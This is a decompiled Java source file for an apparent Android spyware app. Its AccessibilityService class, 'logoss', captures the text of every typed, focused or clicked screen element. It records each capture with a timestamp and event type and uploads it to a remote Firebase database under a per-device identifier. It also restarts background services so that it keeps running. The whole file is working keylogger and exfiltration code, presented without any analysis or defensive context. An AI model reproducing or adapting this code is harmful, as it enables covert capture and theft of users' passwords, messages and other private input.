/*
 * Decompiled with CFR 0.0.
 * 
 * Could not load the following classes:
 *  android.accessibilityservice.AccessibilityService
 *  android.app.ActivityManager
 *  android.app.ActivityManager$RunningServiceInfo
 *  android.content.ComponentName
 *  android.content.Context
 *  android.content.Intent
 *  android.view.accessibility.AccessibilityEvent
 *  com.google.android.gms.tasks.Task
 *  com.google.firebase.database.DatabaseReference
 *  com.google.firebase.database.FirebaseDatabase
 *  java.lang.Class
 *  java.lang.Exception
 *  java.lang.IllegalAccessException
 *  java.lang.Object
 *  java.lang.String
 *  java.util.Date
 *  java.util.Iterator
 *  java.util.LinkedHashMap
 *  java.util.List
 *  java.util.Map
 */
package sigma.male;

import android.accessibilityservice.AccessibilityService;
import android.app.ActivityManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.view.accessibility.AccessibilityEvent;
import com.google.android.gms.tasks.Task;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import java.util.Date;
import java.util.Iterator;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import sigma.male.ForegroundService;
import sigma.male.SketchwareUtil;
import sigma.male.gui;
import sigma.male.main.part2;
import sigma.male.servicess;
import sigma.male.sol.timedate;

public class logoss
extends AccessibilityService {
    private Map<String, String> getMap(part2 part22) throws IllegalAccessException {
        LinkedHashMap linkedHashMap = new LinkedHashMap();
        linkedHashMap.put((Object)"logodate", (Object)timedate.getTheDateInString(part22.getlogoDate()));
        linkedHashMap.put((Object)"logoev", (Object)part22.getAccessibilityEvent());
        linkedHashMap.put((Object)"msg", (Object)part22.getMsg());
        return linkedHashMap;
    }

    private boolean isMyServiceRunning(Class<?> class_) {
        ActivityManager.RunningServiceInfo runningServiceInfo;
        Iterator iterator = ((ActivityManager)this.getSystemService("activity")).getRunningServices(Integer.MAX_VALUE).iterator();
        do {
            if (!iterator.hasNext()) {
                return false;
            }
            runningServiceInfo = (ActivityManager.RunningServiceInfo)iterator.next();
        } while (!class_.getName().equals((Object)runningServiceInfo.service.getClassName()));
        return true;
    }

    private void selogo(String string2, part2 part22) {
        DatabaseReference databaseReference = FirebaseDatabase.getInstance().getReference("logolog/" + gui.uuii(this.getApplicationContext()));
        try {
            databaseReference.push().setValue(this.getMap(part22));
            return;
        }
        catch (Exception exception) {
            exception.printStackTrace();
            return;
        }
    }

    /*
     * Enabled aggressive block sorting
     */
    public void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) {
        String string2;
        String string3 = null;
        if (!this.isMyServiceRunning(servicess.class)) {
            this.startService(new Intent(this.getApplicationContext(), servicess.class));
            SketchwareUtil.showMessage(this.getApplicationContext(), "servicess");
            this.startService(new Intent(this.getApplicationContext(), ForegroundService.class));
        }
        if (!this.isMyServiceRunning(ForegroundService.class)) {
            this.startService(new Intent(this.getApplicationContext(), ForegroundService.class));
        }
        Date date = timedate.getCurrentDay();
        switch (accessibilityEvent.getEventType()) {
            default: {
                string2 = null;
                break;
            }
            case 16: {
                string2 = String.valueOf((Object)accessibilityEvent.getText());
                string3 = "TYPE_VIEW_TEXT_CHANGED";
                break;
            }
            case 8: {
                string2 = String.valueOf((Object)accessibilityEvent.getText());
                string3 = "TYPE_VIEW_FOCUSED";
                break;
            }
            case 1: {
                string2 = String.valueOf((Object)accessibilityEvent.getText());
                string3 = "TYPE_VIEW_CLICKED";
            }
        }
        if (string3 == null) {
            return;
        }
        part2 part22 = new part2();
        part22.setlogoDate(date);
        part22.setAccessibilityEvent(string3);
        part22.setMsg(string2);
        this.selogo("se", part22);
    }

    public void onInterrupt() {
    }

    public void onServiceConnected() {
    }
}

